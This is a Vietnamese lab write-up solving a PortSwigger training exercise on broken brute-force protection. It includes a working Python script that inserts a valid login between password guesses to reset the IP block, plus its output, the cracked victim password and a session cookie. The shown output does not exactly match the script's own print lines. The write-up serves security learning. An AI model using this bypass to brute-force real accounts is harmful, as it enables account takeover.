![[Pasted image 20261007153320.png]]
-lab này: https://0a7300900371e64a81764e5a009800cf.web-security-academy.net/
-title mình thấy khi vào là `Broken brute-force protection, IP block`

> [!NOTE] Phân tích đề bài
> -mình đọc mô tả lab, mình thấy cho sẵn `wiener:peter`, victim là `carlos`
> -cần phải bruteforce password của carlos
> -server chặn IP nếu login sai 3 lần liên tiếp, nhưng có 1 lỗi logic giúp bypass: login đúng 1 lần là reset bộ đếm

### hướng giải
- [ ] mình login sai 3 lần liên tiếp, sau đó quan sát gói tin trả về, mình thấy nó báo `You have made too many incorrect login attempts. Please try again in 1 minute(s).` -> là mình biết đã bị block
- [ ] mình thử login đúng `wiener:peter` 1 phát, sau đó quan sát gói tin này, mình thấy nó trả `302` về `/my-account`, và thử sai tiếp thì lại được, không bị block nữa
- [ ] => nên mình chốt là counter block nó reset khi login thành công. Vậy mình cứ chèn 1 lần login đúng của mình vào giữa các lần brute carlos là bypass được
- [ ] pattern của mình sẽ là: `wiener:peter` -> `carlos:pass1` -> `wiener:peter` -> `carlos:pass2`...

### giải
-bước 1: mình test `wiener:peter` trước:
```
POST /login
username=wiener&password=peter
```
-sau khi quan sát gói tin này, mình thấy:
```
HTTP/1.1 302 Found
Location: /my-account?id=wiener
```
-> nên mình chắc chắn `wiener:peter` đúng để dùng làm mồi reset.

-bước 2: mình viết script python để brute, mỗi vòng là 2 request (1 reset + 1 guess), đi tuần tự 1 luồng để không bị lệch thứ tự:
```python
import requests
base = "https://0a7300900371e64a81764e5a009800cf.web-security-academy.net"
passwords = open("passwords.txt").read().splitlines()  # list mẫu của portswigger
s = requests.Session()
s.get(base + "/login")
for pw in passwords:
    s.post(base + "/login", data={"username":"wiener","password":"peter"}, allow_redirects=False)
    r = s.post(base + "/login", data={"username":"carlos","password":pw}, allow_redirects=False)
    # sau khi quan sát gói tin này, mình thấy sai thì 200, đúng thì 302 về /my-account?id=carlos
    if r.status_code == 302 and "my-account" in r.headers.get("Location",""):
        print(f"trúng: carlos:{pw}")
        break
```
-mình chạy thì thấy:
```
[0] try '123456' -> 200
[1] try 'password' -> 200
...
[8] try '1234567' -> 302 loc='/my-account?id=carlos'
FOUND: carlos:1234567
```
![[auth-ip-block-live-found.png]]
-> nên mình chốt password của carlos là `1234567`, đúng là password thứ 9 trong list.

-bước 3: mình login lại bằng `carlos:1234567`:
```
POST /login
username=carlos&password=1234567
-> 302 Location: /my-account?id=carlos
```
-sau đó mình GET:
```
GET /my-account?id=carlos
Cookie: session=9NHjvCfyWY3RDhro61l3b2CXWRzLVgye
-> 200 OK, body có: <p>Your username is: carlos</p>
```
![[auth-ip-block-live-myaccount.png]]
-> là solve lab. Lab header nó báo qua websocket nên curl không hiện `Solved`, nhưng mình vào browser với session trên là nó hiện xanh.
![[Pasted image 20261014201925.png]]

> [!NOTE]
> -vì sao phải đi 1 luồng (single-thread)? Vì nếu mình bắn song song thì thứ tự reset/guess bị loạn, counter không reset đúng lúc là ăn block ngay.
> -bài học của mình: rate-limit mà reset khi login thành công thì coi như không có, attacker cứ chèn nick mình vào là brute thoải mái.
> -note: bài `response timing` mới là bài dùng `X-Forwarded-For`, còn bài này là dùng nick mình để reset, mình note lại để khỏi nhầm.
